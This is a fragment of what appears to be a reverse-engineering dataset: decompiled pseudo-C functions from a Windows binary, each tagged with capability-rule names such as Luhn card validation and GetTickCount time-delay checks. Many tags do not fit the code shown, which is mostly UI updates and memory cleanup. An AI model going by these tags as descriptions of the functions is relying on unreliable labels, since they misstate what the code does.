0x180045703;\n    (**0x1800de770)(uVar10, bVar3);\n    puVar6 = &stack0xffffffffffffffc8;\n    puVar15 = &stack0xffffffffffffffc8;\n    puVar16 = &stack0xffffffffffffffc8;\n    puVar17 = &stack0xffffffffffffffc8;\n    if ((*(arg1 + 0x53) == '\\0') || (*(arg1 + 0x54) == '\\0')) {\n        cVar14 = '\\0';\n    }\n    else {\n        cVar14 = '\\x01';\n    }\n    uStack64 = 0x18004447a;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0x68), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x53);\n    bVar3 = 0 < iVar8;\n    iVar9 = *(arg1 + 0xb0) - *(arg1 + 0xa8) >> 6;\n    uStack64 = 0x1800444b0;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f8);\n    uStack64 = 0x1800444bb;\n    (**0x1800de718)(uVar10, -(cVar2 != '\\0') & 5);\n    uVar13 = 5;\n    if (*(arg1 + 0x53) != '\\0') {\n        uVar13 = 0;\n    }\n    uStack64 = 0x1800444da;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f7);\n    uStack64 = 0x1800444e5;\n    (**0x1800de718)(uVar10, uVar13);\n    uStack64 = 0x1800444f3;\n    (**0x1800de770)(*(arg1 + 0x68), cVar14);\n    uVar10 = 1;\n    if ((iVar8 < 1) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack64 = 0x180044511;\n    (**0x1800de770)(*(arg1 + 0x70), uVar12);\n    if ((!bVar3) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack64 = 0x18004452f;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f4);\n    uStack64 = 0x18004453a;\n    (**0x1800de770)(uVar11, uVar12);\n    if ((!bVar3) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack64 = 0x180044558;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f5);\n    uStack64 = 0x180044563;\n    (**0x1800de770)(uVar11, uVar12);\n    if ((!bVar3) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack64 = 0x180044581;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f6);\n    uStack64 = 0x18004458c;\n    (**0x1800de770)(uVar11, uVar12);\n    if ((iVar9 == 0) || (uVar12 = uVar10,  cVar14 == '\\0')) {\n        uVar12 = 0;\n    }\n    uStack64 = 0x1800445aa;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f8);\n    uStack64 = 0x1800445b5;\n    (**0x1800de770)(uVar11, uVar12);\n    if (((!bVar3) || (iVar9 == 0)) || (cVar14 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack64 = 0x1800445d6;\n    uVar12 = (**0x1800de798)(*(arg1 + 0x18), 0x27f9);\n    uStack64 = 0x1800445e1;\n    (**0x1800de770)(uVar12, uVar10);\n    uStack64 = 0x1800445f4;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27fa);\n    uStack64 = 0x1800445ff;\n    (**0x1800de770)(uVar10, bVar3);\n    if (cVar14 == '\\0') {\n        uStack64 = 0x18004461d;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27ef);\n        uStack64 = 0x180044628;\n        (**0x1800de770)(uVar10, 0);\n        uStack64 = 0x180044637;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f0);\n        uStack64 = 0x180044642;\n        (**0x1800de770)(uVar10, 0);\n    }\n    else {\n        uStack64 = 0x18004460c;\n        fcn.180044340(arg1);\n    }\n    if (((*(arg1 + 0x52) == '\\0') || (*(arg1 + 0x53) == '\\0')) || (*(arg1 + 0x54) == '\\0')) {\n        cVar14 = '\\0';\n    }\n    else {\n        cVar14 = '\\x01';\n    }\n    uStack80 = 0x1800430be;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0x58), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x52);\n    iVar9 = *(arg1 + 0x98) - *(arg1 + 0x90) >> 6;\n    uStack80 = 0x1800430f1;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800430fc;\n    (**0x1800de718)(uVar10, -(cVar2 != '\\0') & 5);\n    uVar13 = 5;\n    if (*(arg1 + 0x52) != '\\0') {\n        uVar13 = 0;\n    }\n    uStack80 = 0x18004311b;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e1);\n    uStack80 = 0x180043126;\n    (**0x1800de718)(uVar10, uVar13);\n    uStack80 = 0x180043137;\n    (**0x1800de770)(*(arg1 + 0x58), cVar14);\n    uStack80 = 0x18004314f;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27df);\n    uStack80 = 0x18004315a;\n    (**0x1800de770)(uVar10, iVar9 != 0);\n    uStack80 = 0x180043169;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e0);\n    uStack80 = 0x180043174;\n    (**0x1800de770)(uVar10, iVar9 != 0);\n    uVar10 = 1;\n    if ((iVar9 == 0) || (uVar12 = uVar10,  cVar14 == '\\0')) {\n        uVar12 = 0;\n    }\n    uStack80 = 0x180043196;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800431a1;\n    (**0x1800de770)(uVar11, uVar12);\n    if ((iVar9 == 0) || (cVar14 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack80 = 0x1800431bd;\n    uVar12 = (**0x1800de798)(*(arg1 + 0x18), 0x27e3);\n    uStack80 = 0x1800431c8;\n    (**0x1800de770)(uVar12, uVar10);\n    uStack80 = 0x1800431db;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e4);\n    uStack80 = 0x1800431e6;\n    (**0x1800de770)(uVar10, 0 < iVar8);\n    uStack80 = 0x1800431f5;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x2819);\n    uStack80 = 0x180043201;\n    (**0x1800de770)(uVar10, cVar14);\n    uStack80 = 0x180043210;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x281a);\n    uStack80 = 0x18004321c;\n    (**0x1800de770)(uVar10, cVar14);\n    if (cVar14 == '\\0') {\n        uStack80 = 0x18004323a;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27db);\n        uStack80 = 0x180043245;\n        (**0x1800de770)(uVar10, 0);\n        uStack80 = 0x180043254;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27dc);\n        uStack80 = 0x18004325f;\n        (**0x1800de770)(uVar10, 0);\n    }\n    else {\n        uStack80 = 0x180043229;\n        fcn.180042fb0(arg1);\n    }\n    if (*(arg1 + 0x51) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f8150, 0x1d);\n        uVar18 = uStack72;\n        if (uStack64 == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f6ffc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &stack0xffffffffffffffa8;\n            if (7 < uStack64) {\n                puVar5 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar5 + uVar18 * 2) = 0x2a;\n            *(puVar5 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = puVar7[2];\n        uStack44 = puVar7[3];\n        uVar18 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        if (7 < uVar18) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, puVar6);\n        if (uVar18 < 8) {\ncode_r0x0001800407a3:\n            uStack56 = 0;\n            if (uStack64 < 8) {\ncode_r0x0001800407f4:\n                fcn.180068600(*(arg1 + 0x18), 0x2815);\n                goto code_r0x000180040802;\n            }\n            iVar9 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar9;\n            if ((uStack64 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x0001800407f4;\n            }\n        }\n        else {\n            iVar9 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar9;\n            if ((uVar18 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x0001800407a3;\n            }\ncode_r0x000180040cb5:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180040cc1:\n        fcn.1800b3528();\ncode_r0x000180040cc7:\n        fcn.1800b3528();\ncode_r0x000180040ccd:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, 0x1800f8110);\n        fcn.180068540(*(arg1 + 0x18), 0x2815);\ncode_r0x000180040802:\n        if (*(arg1 + 0x52) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81a0, 6);\n            uVar18 = uStack72;\n            if (uStack64 == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70c4);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < uStack64) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar18 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = puVar7[2];\n            uStack44 = puVar7[3];\n            uVar18 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            if (7 < uVar18) {\n                puVar15 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x27e0, puVar15);\n            if (7 < uVar18) {\n                iVar9 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar9;\n                if ((uVar18 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar8);\n                    goto code_r0x00018004092b;\n                }\n                goto code_r0x000180040cc1;\n            }\ncode_r0x00018004092b:\n            uStack56 = 0;\n            if (uStack64 < 8) {\ncode_r0x00018004097c:\n                fcn.180068600(*(arg1 + 0x18), 0x27e0);\n                goto code_r0x00018004098a;\n            }\n            iVar9 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar9;\n            if ((uStack64 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018004097c;\n            }\n            goto code_r0x000180040cc7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27e0, 0x1800f8190);\n        fcn.180068540(*(arg1 + 0x18), 0x27e0);\ncode_r0x00018004098a:\n        if (*(arg1 + 0x53) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x27f6, 0x1800f81b0);\n            fcn.180068540(*(arg1 + 0x18), 0x27f6);\ncode_r0x000180040b12:\n            if (*(arg1 + 0x54) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2807, 0x1800f81d0);\n                fcn.180068540(*(arg1 + 0x18), 0x2807);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81e0, 6);\n            uVar18 = uStack72;\n            if (uStack64 == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f7134);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < uStack64) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar18 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = puVar7[2];\n            uStack44 = puVar7[3];\n            uVar18 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            if (7 < uVar18) {\n                puVar17 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2807, puVar17);\n            if (7 < uVar18) {\n                iVar9 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar9;\n                if ((0xfff < uVar18 * 2 + 2) && (iVar8 = *(iVar9 + -8),  0x1f < (iVar9 - iVar8) - 8U))\n                goto code_r0x000180040cd9;\n                fcn.18008fb24(iVar8);\n            }\n            uStack56 = 0;\n            if (uStack64 < 8) goto code_r0x000180040c88;\n            iVar9 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar9;\n            if (0xfff < uStack64 * 2 + 2) {\n                iVar8 = *(iVar9 + -8);\n                if (0x1f < (iVar9 - iVar8) - 8U) {\n                    fcn.1800b3528(CONCAT44(*0x180101904, *0x180101900), iVar8, uStack64 * 2 + 0x29);\n                    goto code_r0x000180040cb5;\n                }\n            }\n            fcn.18008fb24(iVar8);\ncode_r0x000180040c88:\n            fcn.180068600(*(arg1 + 0x18), 0x2807);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81c0, 6);\n        uVar18 = uStack72;\n        if (uStack64 == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70dc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < uStack64) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar18 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = puVar7[2];\n        uStack44 = puVar7[3];\n        uVar18 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        if (7 < uVar18) {\n            puVar16 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27f6, puVar16);\n        if (7 < uVar18) {\n            iVar9 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar9;\n            if ((uVar18 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x000180040ab3;\n            }\n            goto code_r0x000180040ccd;\n        }\ncode_r0x000180040ab3:\n        uStack56 = 0;\n        if (uStack64 < 8) {\ncode_r0x000180040b04:\n            fcn.180068600(*(arg1 + 0x18), 0x27f6);\n            goto code_r0x000180040b12;\n        }\n        iVar9 = CONCAT62(Stack86, uStack88);\n        iVar8 = iVar9;\n        if ((uStack64 * 2 + 2 < 0x1000) || (iVar8 = *(iVar9 + -8),  (iVar9 - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            goto code_r0x000180040b04;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180040cd9:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 6756
    },
    "180048ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180048ec0(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar2 = arg1[1];\n        if (arg1_00 != iVar2) {\n            do {\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x40;\n            } while (arg1_00 != iVar2);\n            arg1_00 = *arg1;\n        }\n        iVar2 = arg1_00;\n        if ((0xfff < (arg1[2] - arg1_00 & 0xffffffffffffffc0U)) &&\n           (iVar2 = *(arg1_00 + -8),  0x1f < (arg1_00 - iVar2) - 8U)) {\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar2);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "18004902": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180049020(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 << 6;\n    if (arg2 < 0x400000000000000) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 387
    },
    "1800495a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800495a0(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    uchar auStack88 [32];\n    ulong uStack56;\n    int64_t iStack48;\n    uchar auStack40 [16];\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack88;\n    auStack40 = CONCAT88(arg4, arg4);\n    uStack24 = arg1;\n    if (arg2 != arg3) {\n        do {\n            iStack48 = arg4;\n            fcn.18000de50(arg4, arg2);\n            fcn.18000da90(arg4 + 0x20, arg2 + 0x20);\n            arg4 = arg4 + 0x40;\n            auStack40 = CONCAT88(arg4, auStack40._0_8_);\n            arg2 = arg2 + 0x40;\n        } while (arg2 != arg3);\n    }\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 270
    },
    "1800498b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800498b0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x40;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = arg1[2] - arg1_00 & 0xffffffffffffffc0;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg3 * 0x40 + arg2;\n    arg1[2] = arg4 * 0x40 + arg2;\n    return;\n}\n",
        "token_count": 353
    },
    "18004a4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t * fcn.18004a4a0(uint64_t *arg1, uint64_t *arg2, uint64_t *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t **ppuVar2;\n    uint64_t *puVar3;\n    \n    if (arg1 != arg2) {\n        puVar3 = arg1 + 7;\n        do {\n            ppuVar2 = puVar3 + -7;\n            if (arg3 != ppuVar2) {\n                if (0xf < puVar3[-4]) {\n                    ppuVar2 = *ppuVar2;\n                }\n                fcn.180011120(arg3, ppuVar2, puVar3[-5]);\n            }\n            ppuVar2 = puVar3 + -3;\n            if (arg3 + 4 != ppuVar2) {\n                if (7 < *puVar3) {\n                    ppuVar2 = *ppuVar2;\n                }\n                fcn.180010d70(arg3 + 4, ppuVar2, puVar3[-1]);\n            }\n            arg3 = arg3 + 8;\n            puVar1 = puVar3 + 1;\n            puVar3 = puVar3 + 8;\n        } while (puVar1 != arg2);\n    }\n    return arg3;\n}\n",
        "token_count": 297
    },
    "18004a96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004a960(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong *puVar6;\n    int64_t arg1;\n    int64_t iVar7;\n    uchar uVar8;\n    ulong var_50h;\n    ulong var_40h;\n    uint64_t var_38h;\n    ulong var_28h;\n    ulong var_8h;\n    \n    uVar5 = *0x18012a388;\n    var_8h = 0xfffffffffffffffe;\n    cVar3 = (**(*0x180123cb8 + 0x68))(0x180123cb8);\n    if (cVar3 == '\\0') {\n        *0x180123cc0 = uVar5;\n        *0x180123cc8 = *0x18012a390;\n        (**(*0x180123cb8 + 0x60))(0x180123cb8, 0x26ac, 0, 1);\n    }\n    var_40h = CONCAT44(*0x180101914, *0x180101910);\n    var_38h = CONCAT44(*0x18010191c, *0x180101918);\n    var_50h._0_1_ = 0;\n    fcn.180011120(&var_50h, 0x1800f8de8, 0x16);\n    puVar6 = &var_28h;\n    uVar5 = fcn.18000de50(puVar6, &var_50h);\n    cVar3 = fcn.180007d40(puVar6, uVar5);\n    (**0x1800de758)(*0x180123cd0, 0x26ad, cVar3 != '\\0');\n    if (0xf < var_38h) {\n        iVar2 = CONCAT71(var_50h._1_7_, var_50h);\n        arg1 = iVar2;\n        if (0xfff < var_38h + 1) {\n            iVar7 = var_38h + 0x28;\n            arg1 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1) - 8U) goto code_r0x00018004acf0;\n        }\n        fcn.18008fb24(arg1);\n    }\n    var_40h = CONCAT44(*0x180101914, *0x180101910);\n    var_38h = CONCAT44(*0x18010191c, *0x180101918);\n    var_50h._0_1_ = 0;\n    fcn.180011120(&var_50h, 0x1800f8e18, 0x14);\n    puVar6 = &var_28h;\n    uVar5 = fcn.18000de50(puVar6, &var_50h);\n    cVar3 = fcn.180007d40(puVar6, uVar5);\n    (**0x1800de758)(*0x180123cd0, 0x26ae, cVar3 != '\\0');\n    if (0xf < var_38h) {\n        iVar2 = CONCAT71(var_50h._1_7_, var_50h);\n        arg1 = iVar2;\n        if (0xfff < var_38h + 1) {\n            iVar7 = var_38h + 0x28;\n            arg1 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1) - 8U) goto code_r0x00018004acf0;\n        }\n        fcn.18008fb24(arg1);\n    }\n    var_40h = CONCAT44(*0x180101914, *0x180101910);\n    var_38h = CONCAT44(*0x18010191c, *0x180101918);\n    var_50h._0_1_ = 0;\n    fcn.180011120(&var_50h, 0x1800f8e00, 0x12);\n    puVar6 = &var_28h;\n    uVar5 = fcn.18000de50(puVar6, &var_50h);\n    fcn.180007d40(puVar6, uVar5);\n    (**0x1800de758)(*0x180123cd0, 0x26af);\n    if (0xf < var_38h) {\n        iVar2 = CONCAT71(var_50h._1_7_, var_50h);\n        arg1 = iVar2;\n        if (0xfff < var_38h + 1) {\n            iVar7 = var_38h + 0x28;\n            arg1 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1) - 8U) {\ncode_r0x00018004acf0:\n                fcn.1800b3528(arg1, iVar7);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1);\n    }\n    uVar8 = 1;\n    uVar5 = fcn.180067d90(*0x180123cd0, 0x26ad, 0, 0x1800f9030);\n    (**0x1800de7f0)(uVar5, 0x403, 2, 30000, uVar8);\n    uVar8 = 1;\n    uVar5 = fcn.180067d90(*0x180123cd0, 0x26ae, 0, 0x1800f8e30);\n    (**0x1800de7f0)(uVar5, 0x403, 2, 30000, uVar8);\n    uVar8 = 1;\n    uVar5 = fcn.180067d90(*0x180123cd0, 0x26af, 0, 0x1800f92a0);\n    (**0x1800de7f0)(uVar5, 0x403, 2, 30000, uVar8);\n    fcn.180068540(*0x180123cd0, 0x26b7);\n    fcn.18004b2d0();\n    var_40h = 0;\n    var_38h = 0xf;\n    var_50h._0_1_ = 0;\n    puVar6 = &var_50h;\n    fcn.180011120(puVar6, 0x1800f9278, 0xd);\n    iVar4 = fcn.180008250(puVar6, &var_50h, 0xff);\n    uVar5 = (**0x1800de798)(*0x180123cd0, 0x26b8);\n    (**0x1800de7f0)(uVar5, 0x405, 1, iVar4);\n    fcn.180066d20(0x180123cb8);\n    // WARNING: Could not recover jumptable at 0x00018004ace9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de7f0)(*0x180123cc8, 0x806, 0, *0x180123cd0);\n    return;\n}\n",
        "token_count": 1663
    },
    "18004b2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004b2d0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar *arg1;\n    int64_t iVar3;\n    uchar auStack104 [32];\n    uchar auStack72 [16];\n    ulong uStack56;\n    ulong uStack48;\n    int32_t aiStack32 [2];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack104;\n    aiStack32[0] = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack32);\n    if (-1 < aiStack32[0]) {\n        iVar3 = *0x18012a398;\n        if (aiStack32[0] != 0) {\n            iVar3 = *0x18012a3a0;\n        }\n        if (iVar3 != 0) {\n            uVar1 = fcn.18004b1d0();\n            uStack56 = 0;\n            uStack48 = 0xf;\n            arg1 = auStack72;\n            auStack72[0] = 0;\n            fcn.180011120(arg1, 0x1800f9698, 0xd);\n            iVar2 = fcn.180008250(arg1, auStack72, 0xff);\n            (**0x1800de7f0)(iVar3, 0xac1, 0x50, uVar1 | iVar2 << 0x18);\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 366
    },
    "18004b84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18004b840(uchar *arg1, uint32_t *arg2)\n\n{\n    ulong uVar1;\n    \n    (**0x1800de758)(*(arg1 + 8), 0x2718);\n    (**0x1800de758)(*(arg1 + 8));\n    uVar1 = 0;\n    fcn.18004b660(arg1, 1, *arg2);\n    fcn.18004b660(arg1, CONCAT71(uVar1 >> 8, 1), arg2[1]);\n    *arg1 = 1;\n    return;\n}\n",
        "token_count": 134
    },
    "18004bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
